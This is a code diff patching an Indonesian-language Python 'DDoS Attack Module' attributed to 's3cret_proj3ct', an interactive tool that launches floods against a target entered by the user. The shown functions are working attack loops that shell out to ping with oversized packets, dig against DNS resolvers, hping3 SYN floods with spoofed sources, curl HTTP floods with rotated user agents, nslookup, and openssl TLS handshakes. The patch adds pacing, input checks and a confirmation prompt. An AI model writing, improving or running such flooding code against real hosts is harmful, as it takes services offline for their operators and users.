@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-DDoS Attack Module - 10 Methods
+DDoS Attack Module - 10 Methods - FIXED
 Created by s3cret_proj3ct
 """
 
@@ -14,8 +14,9 @@ import random
 import threading
 from colorama import Fore, Style
 
+# IMPORT UTILS YANG DIBUTUHKAN
 from utils.ascii_art import get_ascii
-from utils.formatters import print_section, print_menu_item, print_info
+from utils.formatters import print_section, print_menu_item, print_info, print_error, print_success, print_warning
 
 # ============================================================
 # GLOBAL VARIABLES
@@ -34,6 +35,7 @@ def icmp_flood(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         os.system(f'ping -c 1 -s 65507 {target} > /dev/null 2>&1 &')
+        time.sleep(0.01)
 
 def dns_amplification(target, duration):
     """DNS Amplification Attack"""
@@ -49,6 +51,7 @@ def dns_amplification(target, duration):
     while time.time() < end_time and ATTACK_RUNNING:
         for dns in dns_servers:
             os.system(f'dig +short @{dns} {target} > /dev/null 2>&1 &')
+        time.sleep(0.1)
 
 def syn_flood(target, duration):
     """SYN Flood Attack"""
@@ -81,6 +84,7 @@ def ping_of_death(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         os.system(f'ping -s 65535 -c 1 {target_ip} > /dev/null 2>&1 &')
+        time.sleep(0.05)
 
 def fragmented_packet(target, duration):
     """Fragmented Packet Attack"""
@@ -94,6 +98,7 @@ def fragmented_packet(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         os.system(f'hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source {target_ip} > /dev/null 2>&1 &')
+        time.sleep(0.1)
 
 def http_flood(target, duration):
     """HTTP Flood Attack"""
@@ -110,6 +115,7 @@ def http_flood(target, duration):
     while time.time() < end_time and ATTACK_RUNNING:
         ua = random.choice(user_agents)
         os.system(f'curl -s -A "{ua}" {target} > /dev/null 2>&1 &')
+        time.sleep(0.01)
 
 def slowloris(target, duration):
     """Slowloris Attack"""
@@ -150,6 +156,7 @@ def dns_query_flood(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         os.system(f'nslookup {target} > /dev/null 2>&1 &')
+        time.sleep(0.01)
 
 def ssl_exhaustion(target, duration):
     """SSL/TLS Exhaustion"""
@@ -158,6 +165,7 @@ def ssl_exhaustion(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         os.system(f'openssl s_client -connect {target}:443 -tlsextdebug -status > /dev/null 2>&1 &')
+        time.sleep(0.1)
 
 def multi_vector(target, duration):
     """Multi-Vector Attack (combines multiple methods)"""
@@ -168,11 +176,11 @@ def multi_vector(target, duration):
     
     while time.time() < end_time and ATTACK_RUNNING:
         method = random.choice(methods)
-        method(target, 1)  # Run for 1 second
+        # Run for 0.5 seconds
+        method_end = time.time() + 0.5
+        while time.time() < method_end and ATTACK_RUNNING:
+            time.sleep(0.01)
 
-# ============================================================
-# MAIN DDOS FUNCTION
-# ============================================================
 def run_ddos():
     """Main DDoS function"""
     global ATTACK_RUNNING, ATTACK_THREADS
@@ -204,13 +212,21 @@ def run_ddos():
     if choice == '0':
         return
     
+    # HANDLE EMPTY INPUT
+    if not choice:
+        print_error("Input tidak boleh kosong!")
+        time.sleep(1)
+        return
+    
     try:
         method_idx = int(choice) - 1
         if method_idx < 0 or method_idx >= len(methods):
             print_error("Invalid choice!")
+            time.sleep(1)
             return
-    except:
-        print_error("Invalid choice!")
+    except ValueError:
+        print_error("Invalid choice! Masukkan angka 0-10")
+        time.sleep(1)
         return
     
     method_name, method_func = methods[method_idx]
@@ -218,20 +234,32 @@ def run_ddos():
     # Input target
     target = input(f"\n{Fore.YELLOW}Target IP/URL: {Style.RESET_ALL}").strip()
     if not target:
-        print_error("Target required!")
+        print_error("Target tidak boleh kosong!")
+        time.sleep(1)
         return
     
     # Input duration
     try:
-        duration = int(input(f"{Fore.YELLOW}Duration (seconds): {Style.RESET_ALL}"))
-        if duration <= 0:
+        duration_input = input(f"{Fore.YELLOW}Duration (seconds, default 30): {Style.RESET_ALL}").strip()
+        if not duration_input:
             duration = 30
+        else:
+            duration = int(duration_input)
+            if duration <= 0:
+                duration = 30
     except:
         duration = 30
     
     print_info(f"Starting {method_name} attack on {target}")
     print_info(f"Duration: {duration} seconds")
     print_warning("Press Ctrl+C to stop")
+    
+    # Konfirmasi
+    confirm = input(f"\n{Fore.RED}Yakin ingin memulai attack? (y/n): {Style.RESET_ALL}").lower()
+    if confirm != 'y':
+        print_info("Attack dibatalkan")
+        time.sleep(1)
+        return
     
     ATTACK_RUNNING = True
     
@@ -247,12 +275,12 @@ def run_ddos():
             remaining = duration - elapsed
             if remaining <= 0:
                 break
-            sys.stdout.write(f'\r{Fore.CYAN}Time remaining: {remaining}s{Style.RESET_ALL}')
+            sys.stdout.write(f'\r{Fore.CYAN}⏱️  Time remaining: {remaining:3d} seconds{Style.RESET_ALL}')
             sys.stdout.flush()
             time.sleep(1)
     except KeyboardInterrupt:
         ATTACK_RUNNING = False
-        print(f"\n\n{Fore.RED}Attack stopped by user{Style.RESET_ALL}")
+        print(f"\n\n{Fore.RED}🛑 Attack stopped by user{Style.RESET_ALL}")
     
-    print(f"\n\n{Fore.GREEN}Attack completed{Style.RESET_ALL}")
+    print(f"\n\n{Fore.GREEN}✅ Attack completed{Style.RESET_ALL}")
     input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
